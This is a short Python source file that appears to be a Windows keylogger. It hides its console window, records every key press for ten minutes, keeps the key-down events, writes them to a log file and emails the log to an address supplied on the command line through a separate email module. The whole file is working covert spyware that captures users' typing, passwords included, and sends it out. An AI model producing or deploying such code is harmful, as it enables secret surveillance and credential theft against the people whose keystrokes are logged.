import win32console,win32gui
import keyboard,HandleEmail,sys,time

def checkArgs():
    """
    Checks Commandline arguments to make sure there are enough if not terminates program
    """
    if len(sys.argv) != 4:
        print("Incorrect commandline arguments!")
        sys.exit(0)

def closeConsoleWindow():
    """
    Gets console window and closes it
    """
    win = win32console.GetConsoleWindow()
    win32gui.ShowWindow(win,0)

def onKeyBoardStroke():
    """
    Records keyboard strokes and appends them to log list
    :return: Log of recorded keys within time frame
    """
    Logs = []
    recorded = keyboard.start_recording()
    timelimit = 600 #sets time limit to 10 minutes
    time.sleep(timelimit) #sleep for that long
    keyBoardEventsQueue = recorded[0] #get Queue from recorded
    while keyBoardEventsQueue.qsize() != 0: #while not zero pop from queue
        response = keyBoardEventsQueue.queue.pop() #pop from queue
        stringResponse = str(response) #cast response from type KeyBoard Event to String
        if 'down' in stringResponse: #if user pressed down only append that (pressed down on keyboard)
            Logs.append(stringResponse) #append to Logs
    return Logs

def main():
    checkArgs() #validate args
    closeConsoleWindow() #close window
    user = sys.argv[1]
    passwd = sys.argv[2]
    receiver = sys.argv[3]
    logs = onKeyBoardStroke() # get logs
    logs.reverse() #revere list to make it readable
    trueLogs = [] #create new list
    for log in logs:
        splicedLog = log[14:-6] #splice string to make it more readable
        trueLogs.append(splicedLog + ' ') #add an empty space to make it more readable
    emailFailed = HandleEmail.try_email() #get boolean to see if you can access internet to send email
    if emailFailed == False:
        HandleEmail.createFile(trueLogs) #create Log File
        HandleEmail.send_email(user, passwd, receiver,emailFailed) #send email
        
if __name__ == '__main__':
    main()
